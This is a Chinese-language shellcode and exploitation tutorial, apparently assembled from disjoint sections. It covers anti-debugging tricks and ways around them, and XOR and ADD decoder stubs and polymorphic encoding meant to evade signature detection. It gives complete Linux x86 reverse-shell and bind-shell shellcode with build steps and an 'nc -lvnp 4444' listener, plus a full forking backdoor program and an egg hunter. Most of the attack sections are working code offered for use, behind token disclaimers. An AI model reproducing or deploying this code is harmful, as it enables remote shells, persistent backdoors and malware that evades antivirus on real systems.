; ===== 方法4：PEB NtGlobalFlag =====
; 被调试时 NtGlobalFlag 标志位会不同
; PEB+0x68 = NtGlobalFlag (32位)
; 正常：0x70
; 被调试：0x70 | 0x10 | 0x20 | 0x40 = 0xE0

nt_global_flag_check:
    mov eax, [fs:0x30]          ; PEB
    mov eax, [eax + 0x68]       ; NtGlobalFlag
    and eax, 0x70               ; 检查特定标志
    cmp eax, 0x70
    jne debugging_detected

; ===== 方法5：时间差检测 =====
; 调试器单步执行会导致时间差变大

timing_check:
    ; 记录开始时间
    rdtsc                      ; Time-Stamp Counter -> edx:eax
    push edx
    push eax

    ; ... 一段代码 ...
    ; 正常情况下执行很快

    ; 记录结束时间
    rdtsc

    pop ecx
    pop edx
    sub eax, ecx
    sbb edx, 0

    ; 比较时间差
    cmp edx, 0
    jne debugging_detected     ; 超过 4G 周期，肯定被调试
    cmp eax, 0x100000          ; 阈值（根据实际情况调整）
    ja debugging_detected      ; 超过阈值认为被调试

; ===== 方法6：INT 3 检测 =====
; 调试器断点就是 INT 3 (0xCC)
; 检查代码中是否被插入了 0xCC

int3_check:
    ; 检查函数入口是否是 0xCC
    mov al, [check_function]
    cmp al, 0xCC
    je breakpoint_detected

    ; 检查更多位置...
    ; ...

check_function:
    ; 正常代码
    mov eax, 1
    ret

breakpoint_detected:
    ; 检测到 INT 3 断点
    jmp debugging_detected

; ===== 方法7：异常处理反调试 =====
; 故意触发异常，看是否被调试器接管

seh_check:
    ; 注册异常处理函数
    push offset exception_handler
    push dword [fs:0]
    mov [fs:0], esp

    ; 故意触发异常
    xor eax, eax
    mov [eax], ebx              ; 写入 NULL 指针，触发异常

    ; 如果被调试，调试器会接管异常，不会执行到这里
    ; 如果没被调试，异常处理函数会被调用

exception_handler:
    ; 异常处理函数
    ; 到这里说明没有被调试
    xor eax, eax
    ret

; ===== 方法8：父进程检测 =====
; 正常程序的父进程通常是 explorer、cmd 等
; 如果父进程是调试器（OllyDbg、x64dbg等），说明被调试

parent_process_check:
    ; 调用 CreateToolhelp32Snapshot
    ; 遍历进程列表，找到自己的父进程
    ; 检查父进程名是否是调试器
    ; ...

; ===== 反反调试 =====
; 上面的技术都有绕过方法：
;
; 1. IsDebuggerPresent -> Hook 该函数返回 0
; 2. PEB BeingDebugged -> 修改 PEB 中的标志
; 3. 时间检测 -> 使用 ScyllaHide 等插件
; 4. INT 3 检测 -> 使用硬件断点
; 5. 父进程检测 -> 伪装父进程

; 这是一场猫鼠游戏，不断升级...
```

### 2.5 自定义编码器

```nasm
; ===== Shellcode 编码器 =====
; 当 shellcode 中包含"坏字符"时需要编码
; 坏字符示例：\x00 (null), \x0a (换行), \x0d (回车), \xff 等

; ===== XOR 编码器 =====
; 最简单的编码方式
; 编码：shellcode[i] ^= key
; 解码：同样操作（XOR 是自逆运算）

; 解码存根（decoder stub）
; 执行时先解码，再跳转到真正的 shellcode

xor_decoder:
    jmp short call_decoder      ; 跳到 call 指令

decoder:
    pop esi                     ; esi = 编码后 shellcode 的地址
    mov ecx, shellcode_len      ; ecx = 长度
    xor eax, eax
    mov al, 0xAA                ; al = 密钥

decode_loop:
    xor byte [esi + ecx - 1], al ; 异或解码
    loop decode_loop            ; ecx--，不为零继续

    jmp short encoded_shellcode  ; 解码完成，跳过去执行

call_decoder:
    call decoder                ; call 会把下一条地址压栈
encoded_shellcode:
    ; 这里放编码后的 shellcode
    ; 由编码器生成

; ===== XOR 编码器工作流程 =====
;
; 1. 生成原始 shellcode
; 2. 用密钥逐字节 XOR
; 3. 把解码器 + 编码后的 shellcode 组合起来
; 4. 执行时解码器先解码，再跳到 shellcode

; ===== 递增密钥 XOR =====
; 每个字节用不同的密钥（递增）
; 比固定密钥稍微安全一点

inc_xor_decoder:
    jmp short call_inc_decoder

inc_decoder:
    pop esi
    mov ecx, shellcode_len
    xor eax, eax
    mov al, 0x01                ; 初始密钥

inc_decode_loop:
    xor byte [esi], al
    inc esi
    inc al                      ; 密钥递增
    loop inc_decode_loop

    jmp short inc_encoded

call_inc_decoder:
    call inc_decoder
inc_encoded:
    ; 编码后的 shellcode

; ===== ADD/SUB 编码器 =====
; 用加法编码，减法解码

add_decoder:
    jmp short call_add_dec

add_dec:
    pop esi
    mov ecx, shellcode_len
    mov al, 0x11                ; 密钥

add_decode_loop:
    sub byte [esi + ecx - 1], al ; 减法解码
    loop add_decode_loop
    jmp short add_encoded

call_add_dec:
    call add_dec
add_encoded:
    ; 编码后的 shellcode

; ===== 字母数字编码器 =====
; 编码后的 shellcode 只包含字母和数字
; 用于某些特殊场景（如文件名、URL 等）

; 原理：
; 使用一系列字母数字指令来"构建"真正的 shellcode
; 常用技巧：
; - 用 XOR 和 SUB 运算构造任意字节
; - 用 PUSH/POP 移动数据
; - 自修改代码

; ===== 多态编码（Polymorphic） =====
; 每次编码结果都不一样
; 但功能相同
; 用于绕过基于特征码的检测

; 实现方法：
; 1. 随机生成垃圾指令（不影响功能）
; 2. 指令替换（等价指令互换）
;    mov eax, 0 <-> xor eax, eax
;    add eax, 1 <-> inc eax
; 3. 指令重排序（无依赖的指令）
; 4. 随机选择寄存器

; ===== 壳（Packer）=====
; 更高级的保护技术
; 1. 加密/压缩原始代码
; 2. 加一个解压/解密存根
; 3. 运行时动态解压到内存
; 4. 可能包含反调试、反虚拟机等
;
; 常见的壳：
; - UPX (开源，最简单)
; - ASProtect
; - Themida / VMProtect
; - Enigma Protector
; - ...

; 注意：以上技术仅用于学习研究
; 请勿用于非法用途
```

### 2.6 Reverse Shell 实现

```nasm
; ===== Linux x86 Reverse Shell Shellcode =====
; 连接到攻击者的 IP:PORT，执行 /bin/sh
;
; 系统调用：
;   socketcall = 102
;   dup2 = 63
;   execve = 11
;
; socketcall 子调用：
;   SYS_SOCKET = 1
;   SYS_CONNECT = 3

section .text
global _start

linux_x86_reverse_shell:
    ; ===== 1. 创建 socket =====
    ; int socketcall(int call, unsigned long *args)
    ; socket(AF_INET, SOCK_STREAM, 0)

    xor eax, eax
    xor ebx, ebx
    xor ecx, ecx
    cdq                        ; edx = 0

    ; 参数数组
    push eax                   ; protocol = 0
    push 1                     ; SOCK_STREAM
    push 2                     ; AF_INET
    mov ecx, esp               ; args 数组指针

    mov bl, 1                  ; SYS_SOCKET
    mov al, 102                ; sys_socketcall
    int 0x80                   ; eax = socketfd

    mov esi, eax               ; 保存 sockfd

    ; ===== 2. 连接到远程地址 =====
    ; connect(sockfd, &addr, sizeof(addr))
    ;
    ; struct sockaddr_in {
    ;   short sin_family;   // 2
    ;   unsigned short sin_port; // htons(4444)
    ;   struct in_addr sin_addr;  // 192.168.1.100
    ; };

    push 0x6401a8c0            ; sin_addr = 192.168.1.100 (小端)
    push word 0x5c11           ; sin_port = htons(4444) = 0x115c
    push word 2                ; sin_family = AF_INET
    mov ecx, esp               ; addr 指针

    push 16                    ; addrlen = 16
    push ecx                   ; addr
    push esi                   ; sockfd
    mov ecx, esp               ; args

    mov bl, 3                  ; SYS_CONNECT
    mov al, 102                ; sys_socketcall
    int 0x80

    ; ===== 3. 重定向 stdin/stdout/stderr =====
    ; dup2(sockfd, 0) = stdin
    ; dup2(sockfd, 1) = stdout
    ; dup2(sockfd, 2) = stderr

    xor ecx, ecx
    mov ebx, esi               ; sockfd

dup2_loop:
    xor eax, eax
    mov al, 63                 ; sys_dup2
    int 0x80

    inc ecx
    cmp ecx, 3
    jl dup2_loop

    ; ===== 4. 执行 /bin/sh =====
    xor eax, eax
    push eax
    push 0x68732f2f
    push 0x6e69622f
    mov ebx, esp

    push eax
    push ebx
    mov ecx, esp

    xor edx, edx
    mov al, 11
    int 0x80

; ===== 使用方法 =====
;
; 1. 编译：nasm -f elf32 reverse_shell.asm -o reverse_shell.o
; 2. 链接：ld -m elf_i386 reverse_shell.o -o reverse_shell
; 3. 提取机器码：objcopy -O binary reverse_shell.o shellcode.bin
; 4. 生成 C 格式：xxd -i shellcode.bin
;
; 5. 攻击者端监听：nc -lvnp 4444
; 6. 目标端执行：运行包含 shellcode 的程序
;
; 注意：需要修改 IP 和端口！
; IP 转换：192.168.1.100 -> 0x6401a8c0 (小端序)
; 端口转换：4444 -> htons(4444) = 0x115c

; ===== Bind Shell (被动连接) =====
; 与 Reverse Shell 相反，在目标机器上开端口等待连接
; 步骤：socket -> bind -> listen -> accept -> dup2 -> execve

linux_x86_bind_shell:
    ; 1. socket
    xor eax, eax
    xor ebx, ebx
    push eax
    push 1
    push 2
    mov ecx, esp
    mov bl, 1
    mov al, 102
    int 0x80
    mov esi, eax               ; sockfd

    ; 2. bind
    xor eax, eax
    push eax                   ; INADDR_ANY = 0
    push word 0x5c11           ; port 4444
    push word 2
    mov ecx, esp

    push 16
    push ecx
    push esi
    mov ecx, esp
    mov bl, 2                  ; SYS_BIND
    mov al, 102
    int 0x80

    ; 3. listen
    push 1                     ; backlog
    push esi
    mov ecx, esp
    mov bl, 4                  ; SYS_LISTEN
    mov al, 102
    int 0x80

    ; 4. accept
    xor eax, eax
    push eax
    push eax
    push esi
    mov ecx, esp
    mov bl, 5                  ; SYS_ACCEPT
    mov al, 102
    int 0x80
    mov ebx, eax               ; clientfd

    ; 5. dup2
    xor ecx, ecx
dup2_loop2:
    xor eax, eax
    mov al, 63
    int 0x80
    inc ecx
    cmp ecx, 3
    jl dup2_loop2

    ; 6. execve
    xor eax, eax
    push eax
    push 0x68732f2f
    push 0x6e69622f
    mov ebx, esp
    push eax
    push ebx
    mov ecx, esp
    xor edx, edx
    mov al, 11
    int 0x80

; 注意：本内容仅供学习研究
; 请勿用于未经授权的系统
```

### 2.7 简单后门程序

```nasm
; ===== Linux x86 简单后门 =====
; 功能：监听指定端口，收到连接后执行 shell
; 这是一个汇编版的 bind shell 完整程序

section .text
global _start

_start:
    ; ===== 创建 socket =====
    ; int socket(int domain, int type, int protocol)
    ; 使用 socketcall (eax=102, ebx=SYS_SOCKET=1)

    xor eax, eax               ; 清零
    xor ebx, ebx
    xor ecx, ecx
    cdq                        ; edx = 0

    ; 参数数组
    push edx                   ; protocol = 0 (IPPROTO_IP)
    push byte 1                ; SOCK_STREAM
    push byte 2                ; AF_INET
    mov ecx, esp               ; ecx 指向参数数组

    mov bl, 1                  ; SYS_SOCKET
    mov al, 102                ; sys_socketcall
    int 0x80                   ; 返回值在 eax (sockfd)

    mov esi, eax               ; 保存 sockfd 到 esi

    ; ===== 设置 SO_REUSEADDR =====
    ; 避免 "Address already in use" 错误

    ; 这里简化处理，跳过（可选）

    ; ===== bind 绑定地址和端口 =====
    ; int bind(int sockfd, struct sockaddr *addr, int addrlen)

    xor eax, eax
    push eax                   ; sin_addr = INADDR_ANY (0.0.0.0)
    push word 0x5c11           ; sin_port = htons(4444) = 0x115c
    push word 2                ; sin_family = AF_INET
    mov ecx, esp               ; ecx = &addr

    ; 参数数组
    push byte 16               ; addrlen = 16
    push ecx                   ; addr
    push esi                   ; sockfd
    mov ecx, esp               ; 参数数组

    mov bl, 2                  ; SYS_BIND
    mov al, 102                ; sys_socketcall
    int 0x80

    ; ===== listen 监听 =====
    ; int listen(int sockfd, int backlog)

    push byte 1                ; backlog
    push esi                   ; sockfd
    mov ecx, esp

    mov bl, 4                  ; SYS_LISTEN
    mov al, 102
    int 0x80

    ; ===== accept 接受连接 =====
    ; int accept(int sockfd, struct sockaddr *addr, int *addrlen)

accept_loop:
    xor eax, eax
    push eax                   ; NULL addrlen (不关心客户端地址)
    push eax                   ; NULL addr
    push esi                   ; sockfd
    mov ecx, esp

    mov bl, 5                  ; SYS_ACCEPT
    mov al, 102
    int 0x80                   ; eax = clientfd

    mov ebx, eax               ; ebx = clientfd (dup2 的第一个参数)

    ; ===== fork 子进程处理 =====
    ; 父进程继续监听，子进程处理连接

    xor eax, eax
    mov al, 2                  ; sys_fork
    int 0x80

    cmp eax, 0
    jz child_process           ; 子进程
    ; 父进程：关闭 clientfd，继续 accept
    xor eax, eax
    mov al, 6                  ; sys_close
    int 0x80
    jmp accept_loop

child_process:
    ; 子进程：重定向 IO，执行 shell

    ; 关闭监听 socket
    push esi
    xor eax, eax
    mov al, 6
    int 0x80
    pop esi

    ; ===== 重定向 stdin/stdout/stderr =====
    ; int dup2(int oldfd, int newfd)

    xor ecx, ecx               ; newfd = 0 (stdin)

dup_loop:
    xor eax, eax
    mov al, 63                 ; sys_dup2
    int 0x80                   ; dup2(clientfd, newfd)

    inc ecx
    cmp ecx, 3
    jl dup_loop

    ; ===== 执行 /bin/sh =====
    ; int execve(const char *path, char *const argv[], char *const envp[])

    xor eax, eax
    push eax                   ; NULL 结尾
    push 0x68732f2f            ; "//sh"
    push 0x6e69622f            ; "/bin"
    mov ebx, esp               ; ebx = "/bin//sh"

    push eax                   ; NULL
    push ebx                   ; argv[0] = path
    mov ecx, esp               ; ecx = argv

    cdq                        ; edx = 0 (envp = NULL)

    mov al, 11                 ; sys_execve
    int 0x80

    ; execve 失败则退出
    xor ebx, ebx
    xor eax, eax
    inc eax                    ; sys_exit
    int 0x80

; ===== 编译运行 =====
;
; 编译：
;   nasm -f elf32 backdoor.asm -o backdoor.o
;   ld -m elf_i386 backdoor.o -o backdoor
;
; 运行（目标机器）：
```

### 4.1 Egg Hunter Shellcode

Egg Hunter 是一种在内存中查找并执行主 Shellcode 的技术，适用于注入位置空间不足的场景。

```nasm
; ===== Egg Hunter (Linux x86) =====
; 原理：在内存中搜索特定的标记（egg），找到后跳转到其后执行
; egg 通常是 8 字节（如 0x5090509050905090）
; 优点：只需要很小的空间注入 egghunter，主 shellcode 可以在任意位置

section .text
global _start

_start:
    ; egg 值（必须是唯一的，8字节）
    mov eax, 0x50905090  ; egg = "PUSH NOP PUSH NOP" 的机器码
    cld                  ; 清除方向标志（正向搜索）

next_page:
    or dx, 0xfff          ; dx = 4095（页面大小-1）
next_byte:
    inc edx               ; 指向下一个地址
    lea ebx, [edx + 8]    ; 要验证的地址（egg + 8字节shellcode）
    
    ; 调用 access 系统调用检查地址是否可读
    push byte 0x43        ; sys_access
    pop eax
    int 0x80
    
    cmp al, 0xf2          ; EFAULT = 14 (0xf2 是低字节)
    jz next_page          ; 不可读，跳到下一页
    
    ; 检查 egg 是否匹配
    mov edi, edx          ; 目标地址
    scasd                 ; 比较 eax 和 [edi]，edi += 4
    jnz next_byte         ; 不匹配，继续
    scasd                 ; 再比较后4字节
    jnz next_byte         ; 不匹配，继续
    
    ; 找到了！跳转到 shellcode
    jmp edi               ; edi 现在指向 egg 后面
```

### 4.2 自定义编码 Shellcode

多种编码方式的 Shellcode 编码器和解码器。

```nasm
; ===== XOR 编码的 Shellcode 解码器 =====
; 思路：将 shellcode 用 XOR 编码，运行时动态解码再执行
; 好处：避开特征码检测，减少坏字符

section .text
global _start

_start:
    jmp short call_decoder  ; 跳到 call，利用 call 指令的特性获取地址

decoder:
    pop esi                 ; esi = shellcode 的地址（call 压入栈的返回地址）
    mov edi, esi            ; edi 也指向 shellcode（原地解码）
    mov ecx, shellcode_len  ; ecx = shellcode 长度
    mov bl, 0xAA            ; bl = XOR 密钥

decode_loop:
    mov al, [edi]           ; 取一个字节
    xor al, bl              ; XOR 解码
    stosb                   ; 写回，edi++
    loop decode_loop        ; ecx--，不为0则继续
    
    jmp short shellcode     ; 解码完成，跳过去执行

call_decoder:
    call decoder            ; call 会把下一条指令的地址压栈
    
    ; 编码后的 shellcode（XOR 0xAA）
    shellcode: db 0x9b, 0x6a, 0xfa, 0xc2, 0x85, 0x85, 0xd9, 0xc2
    shellcode_len equ $ - shellcode
```

### 5.8 进阶学习路线

**第 1 阶段：汇编基础（1-2月）**
- 掌握 x86/x64 寄存器、指令集、寻址方式
- 学习栈帧、函数调用约定
- 能够阅读和编写简单的汇编程序

**第 2 阶段：逆向入门（2-3月）**
- 学习 C 语言与汇编的对应关系
- 掌握 IDA/Ghidra 基本使用
- 能够分析简单的 crackme

**第 3 阶段：漏洞利用（3-4月）**
- 栈溢出原理与利用
- Shellcode 开发与编码
- ROP 技术
- 格式化字符串漏洞

**第 4 阶段：堆利用（3-6月）**
- glibc malloc 原理
- fastbin / unlink / UAF
- tcache 攻击
- 各种 House of 技术

**第 5 阶段：高级技术（持续）**
- 内核漏洞利用
- 虚拟化与沙箱逃逸
- 固件逆向
- 反调试与混淆对抗
